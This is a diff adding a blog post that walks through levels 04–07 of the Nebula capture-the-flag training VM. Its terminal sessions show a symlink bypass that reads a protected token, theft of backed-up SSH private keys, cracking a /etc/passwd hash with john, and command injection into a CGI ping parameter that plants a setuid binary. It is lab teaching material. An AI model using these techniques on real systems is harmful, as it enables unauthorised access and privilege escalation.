@@ -30,7 +30,134 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">            <h4 class="date">Sep 05, 2020</h4>
+        <div id="content">            <h4 class="date">Sep 06, 2020</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html" rel="bookmark" title="Permanent Link to &quot;Exploit Education - Nebula Part 2&quot;">Exploit Education - Nebula Part 2</a>
+                </h2>
+
+                
+                
+
+                <h2><a href="https://exploit.education/nebula/level-04/">Level 04</a></h2>
+<h4>Solution</h4>
+<p>Source code shows, that verification happens only for <code>token</code> name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.</p>
+<h4>Result</h4>
+<div class="highlight"><pre><span></span>level04@nebula:/home/flag04$ ls -la
+total <span class="m">13</span>
+drwxr-x--- <span class="m">2</span> flag04 level04   <span class="m">93</span> <span class="m">2011</span>-11-20 <span class="m">21</span>:52 .
+drwxr-xr-x <span class="m">1</span> root   root     <span class="m">160</span> <span class="m">2012</span>-08-27 <span class="m">07</span>:18 ..
+-rw-r--r-- <span class="m">1</span> flag04 flag04   <span class="m">220</span> <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .bash_logout
+-rw-r--r-- <span class="m">1</span> flag04 flag04  <span class="m">3353</span> <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .bashrc
+-rwsr-x--- <span class="m">1</span> flag04 level04 <span class="m">7428</span> <span class="m">2011</span>-11-20 <span class="m">21</span>:52 flag04
+-rw-r--r-- <span class="m">1</span> flag04 flag04   <span class="m">675</span> <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .profile
+-rw------- <span class="m">1</span> flag04 flag04    <span class="m">37</span> <span class="m">2011</span>-11-20 <span class="m">21</span>:52 token
+level04@nebula:/home/flag04$ ./flag04 token
+You may not access <span class="s1">&#39;token&#39;</span>
+level04@nebula:/home/flag04$ ln -s ~flag04/token /tmp/not
+level04@nebula:/home/flag04$ ./flag04 /tmp/not
+06508b5e-8909-4f38-b630-fdb148a848a2
+level04@nebula:~$ su flag04
+Password:  <span class="c1"># use token here</span>
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2><a href="https://exploit.education/nebula/level-05/">Level 05</a></h2>
+<h4>Solution</h4>
+<p>We're looking for weak permissions. It seems that <code>.backup</code> directory contains copy of ssh keys, which can be used.</p>
+<h4>Result</h4>
+<div class="highlight"><pre><span></span>level05@nebula:~$ <span class="nb">cd</span> ~flag05
+level05@nebula:/home/flag05$ ls -ahtl
+total <span class="m">9</span>.0K
+drwxr-x--- <span class="m">1</span> flag05 level05   <span class="m">80</span> <span class="m">2020</span>-09-05 <span class="m">19</span>:18 .
+-rw------- <span class="m">1</span> flag05 flag05    <span class="m">20</span> <span class="m">2020</span>-09-05 <span class="m">19</span>:18 .bash_history
+drwx------ <span class="m">2</span> flag05 flag05    <span class="m">60</span> <span class="m">2020</span>-09-05 <span class="m">19</span>:17 .cache
+drwxr-xr-x <span class="m">1</span> root   root     <span class="m">200</span> <span class="m">2012</span>-08-27 <span class="m">07</span>:18 ..
+drwxr-xr-x <span class="m">2</span> flag05 flag05    <span class="m">42</span> <span class="m">2011</span>-11-20 <span class="m">20</span>:13 .backup
+drwx------ <span class="m">2</span> flag05 flag05    <span class="m">70</span> <span class="m">2011</span>-11-20 <span class="m">20</span>:13 .ssh
+-rw-r--r-- <span class="m">1</span> flag05 flag05   <span class="m">220</span> <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .bash_logout
+-rw-r--r-- <span class="m">1</span> flag05 flag05  <span class="m">3</span>.3K <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .bashrc
+-rw-r--r-- <span class="m">1</span> flag05 flag05   <span class="m">675</span> <span class="m">2011</span>-05-18 <span class="m">02</span>:54 .profile
+level05@nebula:/home/flag05$ <span class="nb">cd</span>
+level05@nebula:~$ ls ~flag05/.backup
+backup-19072011.tgz
+level05@nebula:~$ cp ~flag05/.backup/backup-19072011.tgz .
+level05@nebula:~$ tar -xvf backup-19072011.tgz
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+level05@nebula:~$ ssh flag05@localhost
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2><a href="https://exploit.education/nebula/level-06/">Level 06</a></h2>
+<h4>Solution</h4>
+<p>The <code>flag06</code> came from a legacy unix system. It probably means, that password could be stored inside <code>/etc/passwd</code>. After retrieving password, I had to search for an answer, how to crack it. <code>john</code> helped with that.</p>
+<h4>Result</h4>
+<div class="highlight"><pre><span></span>level06@nebula:~$ grep flag06 /etc/passwd
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+➜  ~ john --show pass
+?:hello
+
+<span class="m">1</span> password <span class="nb">hash</span> cracked, <span class="m">0</span> left
+level06@nebula:~$ su flag06
+Password:  <span class="c1"># use found password</span>
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2><a href="https://exploit.education/nebula/level-07/">Level 07</a></h2>
+<h4>Solution</h4>
+<p>User <code>flag07</code> is running CGI server, which is pinging provided host. Host is an parameter to URL. It means, we should be able to modify URL this way, to retrieve correct information.</p>
+<h4>Result</h4>
+<p>I struggled with that for a while.</p>
+<div class="highlight"><pre><span></span>level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host<span class="o">=</span><span class="p">;</span>getflag
+--2020-09-05 <span class="m">20</span>:31:46--  http://localhost:7007/index.cgi?Host<span class="o">=</span>
+Resolving localhost... <span class="m">127</span>.0.0.1
+Connecting to localhost<span class="p">|</span><span class="m">127</span>.0.0.1<span class="p">|</span>:7007... connected.
+HTTP request sent, awaiting response... <span class="m">200</span> OK
+Length: unspecified <span class="o">[</span>text/html<span class="o">]</span>
+index.cgi?Host<span class="o">=</span>: Permission denied
+
+Cannot write to <span class="sb">`</span>index.cgi?Host<span class="o">=</span><span class="s1">&#39; (Permission denied).</span>
+<span class="s1">getflag is executing on a non-flag account, this doesn&#39;</span>t count
+</pre></div>
+
+
+<p>I wasn't sure, why it is not revealing flag. Finally, I searched through an internet for similar solution and found what's my mistake. I was using <code>;</code> instead of <code>%3b</code> which is encoded semicolon. Instead of sending my payload to website, I was sending <code>Host=localhost</code> and later, I was running separate command, under my username.</p>
+<p>Rookie error.</p>
+<h4>Alternative solution</h4>
+<p>After retrieving <code>getflag</code> I thought about another attempt to exploit a server. For this purpose, I used <code>exploit.c</code> prepared for another level, and I sent this query:</p>
+<div class="highlight"><pre><span></span>level07@nebula:/tmp$ cat &gt; exploitable.sh <span class="s">&lt;&lt; EOF</span>
+<span class="s">cp /tmp/exploit /home/flag07/exploit</span>
+<span class="s">chmod u+s /home/flag07/exploit</span>
+<span class="s">EOF</span>
+level07@nebula:/tmp$ wget localhost:7007/index.cgi?Host<span class="o">=</span>%3b/tmp/exploitable.sh
+level07@nebula:/tmp$ <span class="nb">cd</span> ~flag07
+level07@nebula:/home/flag07$ ls
+exploit  index.cgi  thttpd.conf
+level07@nebula:/home/flag07$ ./exploit
+flag07@nebula:/home/flag07$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html">posted at 00:00</a>
+                    &nbsp;&middot;
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/exploit.html" class="tags">exploit</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/nebula.html" class="tags">nebula</a>
+                </div>
+            </article>            <h4 class="date">Sep 05, 2020</h4>
 
             <article class="post">
                 <h2 class="title">
